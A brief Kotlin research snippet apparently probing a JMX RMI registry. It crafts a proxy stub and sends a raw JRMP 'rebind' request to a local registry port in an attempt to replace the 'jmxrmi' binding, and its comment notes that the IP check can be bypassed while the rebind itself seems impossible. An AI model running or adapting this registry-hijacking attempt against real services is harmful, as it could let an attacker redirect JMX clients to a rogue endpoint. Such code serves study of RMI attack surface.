package example.jmx

import sun.rmi.server.UnicastRef
import sun.rmi.transport.LiveRef
import sun.rmi.transport.tcp.TCPEndpoint
import top.ceclin.jrmp.RegistryV2
import top.ceclin.jrmp.request.Request
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.singleOp
import java.lang.reflect.Proxy
import java.net.Socket
import java.rmi.Remote
import java.rmi.server.ObjID
import java.rmi.server.RemoteObjectInvocationHandler
import javax.management.remote.rmi.RMIServer

/**
 * The ip check can be bypassed, but how to rebind?
 * [sun.management.jmxremote.SingleEntryRegistry.rebind]
 * It seems impossible.
 */
fun main() {
    val host = "127.0.0.1"
    val port = 13567
    val tcpEndpoint = TCPEndpoint(host, port)
    val ref = UnicastRef(LiveRef(ObjID(), tcpEndpoint, false))
    val proxy = Proxy.newProxyInstance(
        Thread.currentThread().contextClassLoader,
        arrayOf(Remote::class.java, RMIServer::class.java),
        RemoteObjectInvocationHandler(ref),
    )
    Socket("127.0.0.1", 2222).use {
        it.tcpNoDelay = true
        val request: Request = RegistryV2.rebind {
            writeObject("jmxrmi")
            writeObject(proxy)
        }.singleOp().request()
        it.outputStream.write(request.value)
    }
}
